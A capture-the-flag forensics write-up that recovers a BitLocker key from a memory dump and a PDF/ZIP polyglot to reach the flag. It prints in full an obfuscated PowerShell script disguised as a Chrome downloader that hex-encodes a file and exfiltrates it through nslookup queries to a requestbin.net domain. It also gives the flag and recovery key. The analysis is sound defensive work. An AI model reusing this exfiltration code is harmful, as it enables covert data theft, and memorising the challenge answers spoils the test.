# Trust Issues

We have the memory dump of Mark's PC and a file ```confidential.pdf``` which was in his computer. We can either start with analysing the memory dump or the suspicious pdf.

## Analysing the memory dump

```bash
vol.py -f trustissues.raw imageinfo

```

Now we have a profile.

Let us do another usual command:

```bash
vol.py -f trustissues.raw --profile=Win7SP1x64 filescan |grep Desktop
```

This should give a long list of files. In this we can find the directory ```Setup files given by sysadmin``` in which there are some setup scripts and installer files. We also notice a ```ChromeDownload.ps1``` which is odd cause why does downloading chrome need a powershell script?

So let us dump this powershell script and see what it contains:

```bash
vol.py -f trustissues.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007d845a10 -D .
cat file.None.0xfffffa8001d33ca0.dat
```

We find the following script:

```powershell
.("{0}{1}"-f 'ech','o'  ) 'Downloading Chrome......'

  & (  "{3}{4}{1}{0}{2}"-f 'eque','R','st','I','nvoke-Web' ) https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7B61A54C60-6972-227A-921D-DAD2B3C34001%7D%26lang%3Den%26browser%3D5%26usagestats%3D1%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26brand%3DONGR%26installdataindex%3Ddefaultbrowser/update2/installers/ChromeSetup.exe -OutFile ChromeSetup.exe

${D`UMp}    =     & ( "{1}{0}{2}"-f 't-','Forma','Hex') -Path 'D:\Bitlo*'
${d`NS}   =    '.7965708720dcbe1fbd5b.d.requestbin.net'

for( ${i}     =     0  ;    ${D`UmP}[${I}];    ${I}++ )
{
    ${h`eX}    =  ${d`UMp}[${i}].ToString(   )
    ${h`EX}   = ${H`Ex}.replace(  ' ','' )
    if( ${I} -lt (${du`MP}.length - 1) )
    {
         ${H`eX}   =   ${h`eX}.Substring(   8,32  )
    }
    else
    {
        ${l`En`GTH}  =     (   (  ${H`ex}.length - 8  )*2  )/3
        ${H`eX}   =   ${h`eX}.Substring(   8,${l`EngtH}  )
    }
      . (  "{1}{2}{0}" -f 'up','nslo','ok') ( ${H`eX}     + ${d`Ns}  ) *>${N`ULl}
}

.("{1}{0}"-f'cho','e'  ) 'Downloaded Chrome'
```

We see an obfuscated script which does hella lot more than just download chrome. On deobfuscating it, we can see that it is converting a file at ```D:\Bitlo*``` into a hexdump and sending it as DNS requests using ```nslookup``` command part by part. This is some sort of a (n00bish) DNS exfiltration attack, performed by the sysadmin who gave these files. (You could have also easily been tipped off by the ```nslookup.exe``` processes in pslist or pstree)

We are also not able to dump nor scan the files in ```D:\```. One way to get the files would be to carve the packets out of the memory dump. You can either use caploader in Windows or you could find third party plugins for volatility such as ethscan or the one used [here](https://github.com/Memoryforensics/carve_packets).

```bash
vol.py --plugins=carve_packets -f trustissues.raw --profile=Win7SP1x64 networkpackets -D .
```

The packets are dumped at ```packets.pcap```. Let us open it in wireshark:

![Wireshark](includes/wireshark.png)

We can see that there is a pattern of query responses of DNS TXID = 2 followed by a Server failure (as it does not correspond to any IP; but note that it is enough for the data to reach the attacker's name server as a query) of TXID = 3 and a No such name response of TXID = 1. Hence for filtering out the hex data, ```dns.id == 2``` is a sufficient filter in our case.

Let us use tshark for this as it is easier to work with in command line:

```bash
 tshark -Y "dns.id == 2" -T fields -e "dns.qry.name"  -r packets.pcap | cut -d '.' -f1 |xxd -r -p
tLocker protected drive.

To verify that this is the correct recovery key compare the identification with what is presented on the recovery screen.

Thus, we have obtained a BitLocker recovery key (packets are disarranged here) which can be used to unlock a drive.

## Analysing the PDF

It is strange that a 5 page pdf has a size of roughly 81 MB. Let us see what is in this:

```bash
 binwalk confidential.pdf 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
42            0x2A            Zip archive data, at least v2.0 to extract, compressed size: 939559, uncompressed size: 939559, name: confidential.pdf
939647        0xE567F         Zip archive data, at least v2.0 to extract, compressed size: 80507861, uncompressed size: 83886592, name: confidential.vhd
81447678      0x4DACAFE       End of Zip archive, footer length: 22

```

We got a ZIP PDF polyglot. On unzipping the PDF, we get the VHD file.

```bash
fdisk -l confidential.vhd
Disk confidential.vhd: 80 MiB, 83886592 bytes, 163841 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

confidential.vhd1        128 157823  157696  77M  7 HPFS/NTFS/exFAT
```

We have the mountable drive starting at offset ```$((512*128)) = 65536```.

```bash
dd if=confidential.vhd of=mountable.dd bs=65536 skip=1
1279+1 records in

file mountable.dd

```

This is a BitLocker encrypted drive as indicated by the ```-FVE-FS-``` header. Mounting this will require ```libbde-utils```.

## Getting the flag

```bash
mkdir mountpoint

bdemount -r 299981-297792-361471-261789-114642-633501-520685-433719 mountable.dd mountpoint/

cp mountpoint/bde1 .

chmod 777 bde1

mkdir new_mountpoint

mount bde1 new_mountpoint

ls new_mountpoint/
'System Volume Information'  'Technical Business Document.docx'   flag.txt

cat new_mountpoint/flag.txt
p_ctf{1_wi$h_y0u_DNSee_th3_kEy}
